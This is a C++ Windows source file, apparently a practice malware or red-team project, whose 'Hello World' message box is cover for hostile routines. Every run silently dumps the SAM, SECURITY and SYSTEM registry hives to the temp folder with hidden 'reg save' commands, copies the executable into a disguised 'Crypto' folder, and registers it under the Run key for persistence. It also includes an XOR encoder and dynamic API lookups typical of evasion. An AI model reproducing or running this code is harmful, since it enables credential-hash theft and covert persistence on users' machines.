// main.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <cstdlib>
#include <string>
#include <tchar.h>

using namespace std;

//Depending on the call type you can use _stdcall or _cdecl


//Define messageboxA typedef
typedef int(_stdcall* Msg) (HWND, LPCSTR, LPCSTR, UINT);
//Define ShellExecuteA typedef
typedef HINSTANCE(_stdcall* Shell) (HWND,LPCSTR,LPCSTR,LPCSTR,LPCSTR,INT);
//Define GetModuleFileNameA
typedef DWORD (_stdcall* ModuleFile)(HMODULE,LPSTR,DWORD );
//Define CopyFile
typedef BOOL (_stdcall* Copying)(LPCTSTR,LPCTSTR,BOOL);


HINSTANCE LLibrary(LPCWSTR dllToLoad);
void DumpSam();
string XorEncoding(string input, char cipher);
void CopyExe();
void AddToRegistry(LPCTSTR data);

int main(int argc, char* argv[])
{ 


	DumpSam();
	CopyExe();




    cout << "\nHello World!\n";

	//Get handle to user32.dll
	HINSTANCE hDll = LLibrary(TEXT("User32.dll"));

	printf("Lib Loaded\n");
	Msg MsgBox = (Msg)GetProcAddress(hDll, "MessageBoxA");
	MsgBox(NULL, "Test", "test", 0);

	//Release the library
	FreeLibrary(hDll);

	return 0;

}

//Function to dump the three registries to file; sam, security and system
void DumpSam() {
	//Load shell32.dll
	HINSTANCE shellDll = LLibrary(TEXT("Shell32.dll"));
	Shell ShellExec = (Shell)GetProcAddress(shellDll, "ShellExecuteA");


	//Save the sam registry
	HINSTANCE samReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\sam %TEMP%\\sam.save ", NULL, SW_HIDE);

	//Check if value returned is greater than 32
	if (!((int)samReg >32)) {
		printf("Error dumping sam reg");
	}

	//Save the security registry
	HINSTANCE securityReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\security  %TEMP%\\security.save ", NULL, SW_HIDE);

	if (!((int)securityReg > 32)) {
		printf("Error dumping security reg");
	}

	//Save the system registry
	HINSTANCE systemReg = ShellExec(NULL, "open", "cmd.exe", "/C reg save hklm\\system %TEMP%\\system.save ", NULL, SW_HIDE);

	if (!((int)systemReg > 32)) {
		printf("Error dumping system reg");
	}
}

//Function to load library
HINSTANCE LLibrary(LPCWSTR dllToLoad) {
	HINSTANCE hDll = LoadLibrary(dllToLoad);

	if (hDll == NULL) {
		wprintf(L"Error getting handle to: %s",dllToLoad);
		exit(1);
	}
	
	return hDll;
}

//Function to encode/decode text
string XorEncoding(string input, char cipher) {

	for (int i = 0; i < input.size(); i++)
	{
		input[i] = input[i] ^ cipher;
	}

	return input;
}

//Function to copy the current exe to Crypto folder
void CopyExe() {
	HINSTANCE kernelDll = LLibrary(TEXT("Kernel32.dll"));
	ModuleFile ModuleFileName = (ModuleFile)GetProcAddress(kernelDll, "GetModuleFileNameA");
	Copying CopyingFile = (Copying)GetProcAddress(kernelDll, "CopyFile");

	//TODO: Use GetProcAddress functions to call the functions

	wchar_t charArray[MAX_PATH];
	//Get the full path from the handle
	GetModuleFileName(NULL, charArray, MAX_PATH);
	//Copy the current exe to the Crypto folder, and overwrite if one exists
	LPCTSTR path = L"C:\\ProgramData\\Microsoft\\Crypto\\crypto.exe";
	CopyFile(charArray,path, FALSE);

	//Once the file is copied add the exe to registry
	AddToRegistry(path);

}

void AddToRegistry(LPCTSTR data)
{
	HKEY hKey;

	LPCTSTR value = L"crypto";
	
	//Open the CurrentVersion\Run key 
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
		//Write the value and data to the opened key
		LSTATUS ret=RegSetValueEx(hKey, L"crypto", 0, REG_SZ, (LPBYTE)data, _tcslen(data) *sizeof(TCHAR));
		if (ret==ERROR_SUCCESS)
		{
			printf("Good adding");

		}
		else {
			printf("Error adding");
		}
		RegCloseKey(hKey);
	}
	else {
		printf("error opening");
	}
}

